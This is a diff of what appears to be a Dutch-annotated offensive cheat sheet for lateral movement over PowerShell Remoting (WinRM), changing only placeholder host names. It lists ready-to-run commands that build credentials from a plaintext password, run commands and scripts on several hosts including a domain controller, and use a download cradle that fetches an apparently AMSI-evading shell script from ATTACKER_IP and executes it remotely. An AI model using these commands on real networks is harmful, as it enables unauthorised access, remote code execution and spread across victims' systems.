@@ -1,14 +1,14 @@
 # Lateral Movement via PowerShell Remoting (WinRM)
 # Methode 1: Interactieve sessie
-powershell -c "$cred=New-Object System.Management.Automation.PSCredential('DOMAIN\user',(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)); Enter-PSSession -ComputerName TARGET -Credential $cred"
+powershell -c "$cred=New-Object System.Management.Automation.PSCredential('DOMAIN\user',(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)); Enter-PSSession -ComputerName TARGET_IP -Credential $cred"
 # Methode 2: Remote commando uitvoeren
-Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami; hostname; ipconfig}
+Invoke-Command -ComputerName TARGET_IP -Credential $cred -ScriptBlock {whoami; hostname; ipconfig}
 # Methode 3: Script uitvoeren op meerdere targets
 Invoke-Command -ComputerName TARGET1,TARGET2,DC01 -FilePath C:\Windows\tasks\script.ps1
 # Methode 4: Download cradle remote uitvoeren
-Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')}
+Invoke-Command -ComputerName TARGET_IP -Credential $cred -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payloads/amsi-shell.ps1')}
 # Methode 5: Persistent sessie (herbruikbaar)
-$sess = New-PSSession -ComputerName TARGET -Credential $cred
+$sess = New-PSSession -ComputerName TARGET_IP -Credential $cred
 Enter-PSSession -Session $sess
 # Tip: Standaard op poort 5985 (HTTP) of 5986 (HTTPS)
 # Tip: WinRM moet actief zijn op target (standaard aan op servers)
